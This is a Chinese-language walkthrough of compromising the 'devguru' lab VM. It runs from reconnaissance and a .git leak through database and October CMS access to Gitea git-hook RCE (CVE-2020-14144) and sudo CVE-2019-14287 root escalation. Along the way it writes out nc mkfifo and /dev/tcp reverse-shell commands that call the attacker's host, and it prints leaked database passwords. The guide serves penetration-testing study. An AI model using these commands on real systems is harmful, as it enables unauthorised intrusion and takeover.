# 前言

靶机：`devguru`靶机，IP地址为`192.168.10.12`

攻击：`kali`，IP地址为`192.168.10.6`

靶机采用`virtualbox`虚拟机，攻击机采用`VMware`虚拟机，都采用桥接网卡模式

> 文章涉及的靶机及工具，都可以自行访问官网或者项目地址进行获取，或者通过网盘链接下载 `https://pan.quark.cn/s/6b80c0d4a024`

# 主机发现

也就是相当于现实环境中去发现确定主机的`ip`地址，因为这里是靶机环境，所以跳过了从域名到`ip`地址的过程。

使用`arp-scan -l`或者`netdiscovery -r 192.168.10.1/24`

当然也可以使用`nmap`等工具进行

```shell
netdiscover -r 192.168.10.1/24
```

![](./pic/1.jpg)

# 信息收集

## 使用nmap扫描目标端口等信息

首先扫描目标的`tcp`端口的开放情况

```shell
nmap -sT --min-rate=1000 192.168.10.12 -p- -oA nmap-tcp
```

![](./pic/2.jpg)

再扫描`udp`端口的开放情况

```shell
nmap -sU --min-rate=1000 192.168.10.12 --top-ports 20 -oA nmap-udp
```

![](./pic/3.jpg)

可以看到明确开放的`udp`端口没有，所以下面对`tcp`端口进行一个筛选，这里因为`22`端口并不是明确`closed`的，是`filtered`的，所以也要包括在内

```shell
ports=`grep /tcp nmap-tcp.nmap | awk -F'/' '{print $1}' | paste -sd ','`
```

![](./pic/4.jpg)

进一步对这些端口进行服务、系统等探测

```shell
nmap -sV -O -sC 192.168.10.12 -p $ports --min-rate=1000
```

![](./pic/5.jpg)

![6](./pic/6.jpg)

![7](./pic/7.jpg)

再使用`nmap`的漏洞检测脚本对这些端口进行探测

```shell
nmap --script=vuln 192.168.10.12 -p $ports
```

![](./pic/8.jpg)

![9](./pic/9.jpg)

## 网站信息探测

### 80端口网站

访问80端口的网站界面，可以看到是标准的网站形式

![](./pic/10.jpg)

查看了页面源代码，发现大部分的超链接都是指向这个主界面，没有价值

使用`whatweb`或者`wappalyzer`插件识别网站的一些配置等

![](./pic/11.jpg)

尝试进行目录爆破，这里建议采用`dirb`或者`dirsearch`，我使用`gobuster`，但是内容多，有点慢了

```shell
#使用默认的字典即可
dirb http://192.168.10.12
```

![](./pic/12.jpg)

既然这么多目录，访问测试，看哪些有用。

访问`.git`，并没有内容，访问`.git/HEAD`，发现内容

![](./pic/13.jpg)

访问`.htaccess`文件，发现确实可以

![](./pic/14.jpg)

访问`backend`，发现跳转到一个登录界面了，更加确定为`october`的CMS

![](./pic/15.jpg)

点击忘记密码，发现跳转了，并且提供用户名即可

![](./pic/16.jpg)

其他的目录大差不差，就不访问了



### 8585端口网站探测

访问默认界面，发现是`gitea`

![](./pic/17.jpg)

并且在网站的最下面，有其版本`1.12.5`

![](./pic/18.jpg)

测试功能点，点击探索，发现一个用户`frank`

![](./pic/19.jpg)

查看登录，发现登录所具有的功能点，这里都有

![](./pic/20.jpg)

**信息小结**

两个网站总共来说就是登录框很多，那么就可以测试一下这方面的

一个用户名`frank`，网站CMS `october`，只是版本还未知

# git信息泄露

之前目录爆破发现的`.git`，借助工具`githacker`或`githack`测试有无可用

```shell
#安装githacker
python -m venv venv
source venv/bin/activate
python3 -m pip install -i https://pypi.org/simple/ GitHacker

githacker --help
githacker --url http://192.168.10.12/.git/ --output-folder result
```

```shell
#安装githack
git clone https://github.com/lijiejie/GitHack.git
python GitHack.py http://192.168.10.12/.git/
```

可以查看获取的结果，大概就是网站的源代码了

![](./pic/21.jpg)

查看`config`目录，一般放置的都是配置文件，查看，发现有一个`database.hp`，查看发现是有数据库连接的，并且是各个数据库，不过发现只有`mysql`有密码`SQ66EBYx4GT3byXH`

![](./pic/22.jpg)

根据这个`mysql`的连接，名称与`october`的CMS一样的，不过现在只知道数据库连接的，还是没有突破，继续查看其他文件

这里需要注意，从`git`获取的这些文件，不正是对应着目录爆破的哪些目录吗，也就是说这里的几个文件或许可以直接访问，只是目录爆破没有爆破出

查看`adminer.php`，发现可能是数据库管理文件，那就代表可能是连接数据库，并且这个文件的位置，大概率是可以直接访问的

![](./pic/23.jpg)

# 漏洞寻找

构造链接，访问后确实如此，并且是数据库连接的，且只能选择`mysql`数据库

```shell
http://192.168.10.12/adminer.php
```

![](./pic/24.jpg)

以上面配置文件获取的用户名`october`和密码`SQ66EBYx4GT3byXH`登录，发现成功

![](./pic/25.jpg)

点击`octoberdb`数据库，然后查看对应的表即可，然后点击`backend_users`表，添加数据，因为这里默认的一个`frank`，其密码出了爆破很难出结果了

![](./pic/26.jpg)

当然选择之后一些参数需要确认，并不是随便的都行，建议自己去测试

![](./pic/27.jpg)

![](./pic/28.jpg)

创建数据时，把`role_id`选择为2，是因为`backend_user_roles`这个表

![](./pic/29.jpg)

然后以用户名`cat`和密码`12345`去访问`http://192.168.10.12/backend`去登录

![](./pic/30.jpg)

登录后测试，发现在`media`处可以有上传，但是所作的过滤有的，尝试各种修改，发现`php`文件无法绕过上传，即使上传了图片文件，但是`.htaccess`文件也无法上传，所以无用

尝试在CMS菜单处，添加一个文件，并且具有`php`代码，但是发现保存是成功了，但是访问后`php`代码并没有执行，并且给出错误提示

![](./pic/32.jpg)

查看其他文件，发现采用的是`php`代码的形式，不过与前面提示的一样，需要定义函数的形式

![](./pic/33.jpg)

# 构造命令执行

那么直接复制这个代码，然后粘贴到可访问到的页面，如`home`页面

![](./pic/34.jpg)

代码粘贴后，点击`save`，也就是保存，然后再点击`preview`也就是预览，这就不需要再去找路径去访问了，这时候就可以测试是否可用，发现完全可以

![](./pic/35.jpg)

那么尝试能否反弹一个`shell`，构造代码

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.10.6 9999 >/tmp/f

#进行url编码
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%20192.168.10.6%209999%20%3E%2Ftmp%2Ff
```

在`kali`上使用`nc`监听，然后浏览器去访问

![](./pic/36.jpg)



那么，老样子，首先因为还有一个网站的原因，所以先搜索一下

```shell
find / -name "gitea" 2>/dev/null
```

但是搜索到的路径，都没有权限

那么查看一下备份文件，为什么说查看呢，因为一般可能在`/var/backups`这个目录，默认是备份文件夹，当然若是没有，还是需要借助`find`去搜索

```shell
ls -la /var/backups
```

发现有一个所有者为`frank`的文件，并且可以查看的

![](./pic/37.jpg)

使用`cat`查看这个文件，前面可以看到这里是`gitea`的文件

![](./pic/38.jpg)

# gitea数据库渗透

向下继续看，发现`ssh`端口号，不过还是发现一个数据库的配置

![](./pic/39.jpg)

用户名`gitea`和密码`UfFPTF8C8jjxVF2m`

这里还是需要进一步获取`shell`，防止`mysql`连接出现问题，当然如果采用前面的`adminer.php`的数据库管理的话，可以不需要

```shell
dpkg -l | grep python  #确定python版本
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

然后连接数据库

```shell
mysql -ugitea -pUfFPTF8C8jjxVF2m
```

![](./pic/40.jpg)

可以看到密码，但是是加密的，不知道算法

![](./pic/41.jpg)

那么可以尝试添加一个账户进行测试

```sql
#插入数据
insert into user (id,name,passwd,is_admin) values (2,dog,123456,1);

#更新数据
update user set passwd='123' where id=2;

#查询数据
select * from user where id=2 \G;

#删除数据
delete from user where id=2;
```

这里建议采用网站访问并进行，为什么，因为这里经过测试，密码的加密，不知道哪一种可用，所以采用网站上面的几种加密。不过上面的增删改查的基本操作要会，并不是都有网站数据库管理界面的

与前面一样，这里连接数据库时，采用`gitea`用户名和与其对应的密码`UfFPTF8C8jjxVF2m`

然后就访问到`gitea`的数据库，这时候添加数据即可

但是这里添加后，测试几种加密方式，明显也不对

![](./pic/42.jpg)

应该还是需要算法，这里查看`app.ini.bak`时，发现采用`pbkdf2`，但是并没有加密函数，而`gitea`的配置文件又无权访问，所以只能在网上搜索一下。

> 在 Gitea 的代码中，密码加密相关的逻辑通常位于`models/user.go`文件中

去找它的官方，在`github`上搜索`https://github.com/go-gitea/gitea/archive/refs/tags/v1.12.5.zip`，可以找到对应的`1.12.5`版本的源代码，下载到本地去查看

![](./pic/43.jpg)

这一个与备份文件中所指定的一样

```shell
tempPasswd = pbkdf2.Key([]byte(passwd), []byte(salt), 10000, 50, sha256.New)
```

那么因为需要`go`环境，而我这里没有，所以访问一个在线编译的

```shell
tempPasswd = pbkdf2.Key([]byte('123456'), []byte('Bop8nwtUiM'), 10000, 50, sha256.New)
#这个盐值，是在数据库中的user表中具有的，可以自行查看
```

使用`ai`让他帮忙还原代码的形式

```go
package main

import (
    "crypto/sha256"
    "fmt"
    "golang.org/x/crypto/pbkdf2"
)

func main() {
    password := []byte("123456")
    salt := []byte("Bop8nwtUiM")
    iterations := 10000
    keyLength := 50
    hash := sha256.New

    tempPasswd := pbkdf2.Key(password, salt, iterations, keyLength, hash)
    fmt.Printf("派生密钥的十六进制表示: %x\n", tempPasswd)
}
```

然后在网站`https://go.dev/play/`执行，这个需要一点魔法去访问，国内的执行，不知道什么原因，会报错

![](./pic/44.jpg)

尝试添加用户，并把这个生成的密码给给予

```shell
4f6289d97c8e4bb7d06390ee09320a272ae31b07363dbee078dea49e4881cdda50f886b52ed5a89578a0e42cca143775d8cb
```

但是，这里创建用户`jerry`后，尝试登录，发现以`123456`登录不行

![](./pic/45.jpg)

这里不应该出错，算法是按照版本来的，难道改了算法，再尝试，想起之前在该界面的注册功能，是不可以注册的，那么是否说明数据库做了限制，只允许这一个`frank`用户。那么尝试修改`frank`的密码为这个。

这里还是建议把`frank`的原本密码备份一下，万一是算法出错呢

# cve-2020-14144漏洞复现

在数据库修改后，以`frank`和密码`123456`登录，成功了

![](./pic/46.jpg)

在使用`searchsploit`时，发现该版本有对应的版本漏洞的，编号`cve-2020-14144`

这里执行脚本就可以，但是我想要搞清楚过程，所以去网上搜索了一下，网站`https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce`给了我想看到的。

首先找到`githook`

![](./pic/47.jpg)

然后编辑对应的`post-receive`

![](./pic/48.jpg)

然后在这里编写`bash`反弹shell

```shell
#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/192.168.10.6/8888 <&1'
```

编辑好，点击`update`即可

![](./pic/48-1.jpg)

这时候，可以看到已经启用了

![](./pic/49.jpg)

这时候先在`kali`使用`nc`开启监听8888端口

```shell
nc -lvnp 8888
```

然后在`kali`另起一个终端，执行`git`命令

```shell
touch README.md
git init
git add README.md
git commit -m "Initial commit"
git remote add origin http://192.168.10.12:8585/frank/devguru-website.gi
git push -u origin master
```

其实这里简单来说，就是当文件有改动，然后把文件上传到`git`时，就会触发构造的`post receive`

![](./pic/50.jpg)



基于上面的方式，还有另一种，也是利用`githook`，不过利用的是`pre receive`，在这里添加脚本命令

```shell
#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/192.168.10.6/7777 <&1'
```

![](./pic/51.jpg)

然后编辑上面的命令后，更新即可

![](./pic/52.jpg)

然后直接去`code`处，编辑已有的文件，如编辑`README.md`，随便输入

![](./pic/53.jpg)

![54](./pic/54.jpg)

然后在`kali`开启监听7777端口，然后再点击提交，即可发现反弹`shell`成功了

![](./pic/55.jpg)

# 提权

使用`python`先获取shell，防止信息不出

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

查看`frank`下的`user.txt`

![](./pic/56.jpg)

这里我就不放`find`寻找具有SUID权限的文件了，我这里反弹shell后，靶机特别卡

```shell
find / -perm -4000 -print 2>/dev/null
```



发现有`sudo`，测试`sudo -l`，发现无需密码的文件

![](./pic/57.jpg)

> 这是具体允许 `frank` 以指定权限（除 `root` 外的其他用户身份且免密）执行的命令，即 `frank` 可以免密码使用 `sudo` 以除 `root` 之外的其他用户身份运行位于 `/usr/bin` 目录下的 `sqlite3` 程序

这个可以访问网站去查看具体用法`https://gtfobins.github.io/`

```shel
sudo /usr/bin/sqlite3 /dev/null '.shell /bin/sh'
```

但是这样需要输入`frank`的密码，到现在为止，并没有获取到

查看`sudo`的版本

```shell
sudo --version
```

![](./pic/58.jpg)

发现版本`1.8.21p2`，直接搜索一下该版本的漏洞，发现漏洞

> CVE-2019-14287 Linux sudo权限绕过漏洞的复现过程，包括创建用户、编辑sudoers文件以允许test用户执行/usr/bin/vim，然后通过sudo -u#-1 vim命令以root权限执行其他命令，最终达到权限提升的目的

所以这里就可以配合`sudo -l`的文件进行提权了

```
sudo -u#-1 /usr/bin/sqlite3 /dev/null '.shell /bin/sh'
```

![](./pic/59.jpg)

这里对于靶机内的信息收集，我个人就不再放置图片了，实在太多了，这个文章的图有点多，所以这里大家自己去收集，与平常没什么不同的，就是`find、ss、ps、top、crontab、df`等和一些脚本`pspy64、les.sh`等的使用

# 总结

该靶机更贴近现实，两个网站的反弹`shell`考察点都不一样

1. 对于`git`信息泄露的获取，搞到一些源码文件，进一步扩大影响
2. 网站目录爆破很重要，这里就是因为没有爆破到`adminer.php`，错过网站数据库管理系统。虽然是通过`git`信息泄露也获取到了
3. 对于`php`，以及一些模板的了解，这里的80端口网站的一些文件，所用的模板并非常见的，也是需要知道的，这里我就是模仿的，才获取到一个命令执行的漏洞构造
4. 备份文件要会寻找，以及文件要能抓到信息。这里抓到的数据库连接信息，配合网站数据库管理可以进一步操作
5. 对于开源的一些CMS，都可以去看一下，或许有的网站管理员并没有二次修改，采用默认的，那么就可以猜测到密码的构造
6. 漏洞复现，不能依靠脚本，要明白每一步的做法，这样更灵活
7. 提权，考察的是对于`sudo`版本的`cve`漏洞，要明白`CVE-2019-14287`
